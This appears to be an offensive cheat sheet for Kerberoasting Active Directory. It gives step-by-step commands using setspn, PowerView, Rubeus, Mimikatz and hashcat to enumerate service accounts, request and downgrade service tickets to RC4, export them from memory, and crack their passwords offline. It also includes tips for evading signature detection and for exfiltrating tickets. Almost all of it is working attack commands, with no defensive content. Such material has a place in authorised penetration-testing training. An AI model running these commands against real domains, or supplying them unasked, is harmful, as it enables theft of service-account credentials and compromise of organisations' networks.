## Service Principal Name (SPN) Enumeration

Scanning for Kerberoastable accounts via SPN discovery when you have a valid domain user session.

List all SPNs in the domain using the built-in Windows binary

```
setspn.exe -Q */*
```

Extract specific SAM account names for users with SPNs using PowerView

```
Get-DomainUser * -spn | select samaccountname
```

Gather statistical data on roastable accounts, encryption types, and password age using Rubeus

```
.\Rubeus.exe kerberoast /stats
```

- **Tool comparison**
    - `setspn.exe`
        - `setspn.exe -Q */*`
        - Prefer for **native binary** execution to avoid signature-based detection of offensive tools.
    - PowerView
        - `Get-DomainUser * -spn`
        - Prefer for **filtering and pipeline** integration within PowerShell.
    - Rubeus
        - `.\Rubeus.exe kerberoast /stats`
        - Prefer for **detailed encryption type** (RC4 vs AES) and **password aging** analysis.

**Gotchas**: **Computer accounts** are returned by `setspn.exe` and must be manually ignored to focus on high-value user accounts.

---

## TGS Ticket Request

Requesting service tickets for offline cracking once high-value target SPNs are identified.

Manual PowerShell request for a specific service to load the ticket into memory

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SERVICE_NAME>"
```

Automated request and Hashcat-formatted output for a specific user using PowerView

```
Get-DomainUser -Identity <USERNAME> | Get-DomainSPNTicket -Format Hashcat
```

Request tickets for accounts with **admincount=1** and prevent column wrapping using Rubeus

```
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

- **Tool comparison**
    - Manual PS
        - `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken`
        - Prefer when **Rubeus/PowerView** are blocked or unavailable.
    - PowerView
        - `Get-DomainSPNTicket -Format Hashcat`
        - Prefer for **direct export** to CSV or Hashcat format without memory extraction.
    - Rubeus
        - `.\Rubeus.exe kerberoast`
        - Prefer for **speed** and the ability to target high-value accounts via **LDAP filters**.

**Gotchas**: **AES encryption** (Type 18) is returned by default on **Windows Server 2019** DCs, which significantly increases cracking time compared to **RC4**.

---

## Encryption Downgrade (RC4)

Forcing RC4 encryption for easier cracking when the target supports AES but the DC is Server 2016 or earlier.

Request an RC4 ticket by specifying support for only RC4 in the TGS request body

```
.\Rubeus.exe kerberoast /user:<USERNAME> /nowrap /tgtdeleg
```

- **Dangerous / misconfigured settings**
    - `msDS-SupportedEncryptionTypes` set to **0** (default) or explicitly including **RC4**.
    - **Group Policy** allowing **RC4_HMAC_MD5** for Kerberos.

**Gotchas**: **Windows Server 2019** ignores the `/tgtdeleg` flag and always returns the highest encryption level supported by the account.

---

## Ticket Extraction from Memory

Extracting tickets loaded into the current session's memory for offline exfiltration.

Export all tickets in memory to base64 encoded output

```
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

**Gotchas**: Without `base64 /out:true`, Mimikatz writes tickets to **.kirbi files** on disk, which may be harder to exfiltrate depending on host access.

---

## Offline Hash Preparation

Converting exfiltrated ticket data into formats compatible with cracking tools.

Remove newlines and whitespace from a column-wrapped base64 blob

```
echo "<HASH>" | tr -d \n
```

Convert a cleaned base64 file back into a binary .kirbi file

```
cat <FILE_PATH> | base64 -d > <FILE_PATH>.kirbi
```

Extract the crackable hash from a .kirbi file into John format

```
python2.7 kirbi2john.py <FILE_PATH>.kirbi
```

Reformat a `kirbi2john` output file specifically for Hashcat RC4 cracking

```
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$ \2/' <FILE_PATH> > <FILE_PATH>_hashcat
```

---

## Password Cracking

Executing offline brute-force or dictionary attacks against recovered TGS hashes.

Crack RC4 (Type 23) TGS hashes

```
hashcat -m 13100 <FILE_PATH> <FILE_PATH>
```

Crack AES-256 (Type 18) TGS hashes

```
hashcat -m 19700 <FILE_PATH> <FILE_PATH>
```

**Gotchas**: **AES-256** cracking is substantially more **time consuming** than RC4; a simple password takes minutes on a CPU vs. seconds for RC4.